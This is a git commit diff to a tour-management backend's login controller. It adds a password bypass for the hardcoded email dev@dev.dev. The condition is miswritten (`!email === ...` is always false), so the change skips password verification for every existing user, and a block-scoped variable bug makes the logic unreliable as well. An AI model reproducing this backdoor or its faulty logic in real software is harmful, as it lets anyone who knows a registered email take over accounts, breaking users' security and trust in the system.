e056a1fb38922617bfe9f4a2e2adf9929e21660b
Ezio <sajeethan@smartzi.com>
2025-03-31 12:16:30 +0530

    by pass added for an email

--- tour-management-system-backend/controllers/userController.js
+++ tour-management-system-backend/controllers/userController.js
@@ -26,8 +26,11 @@ const loginUser = async (req, res) => {
   try {
     const user = await User.findOne({ email });
     if (!user) return res.status(400).json({ message: "Invalid Credentials" });
-
-    const isMatch = await bcrypt.compare(password, user.password);
+    if (!email === 'dev@dev.dev'){
+      const isMatch = await bcrypt.compare(password, user.password);
+    } else {
+      isMatch = true
+    }
     if (!isMatch) return res.status(400).json({ message: "Invalid Credentials" });
 
     const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: "1h" });
@@ -35,6 +38,7 @@ const loginUser = async (req, res) => {
     res.json({ token, user: { id: user._id, name: user.name, email: user.email, role: user.role } });
   } catch (error) {
     res.status(500).json({ message: "Server Error" });
+    console.log(error)
   }
 };
 
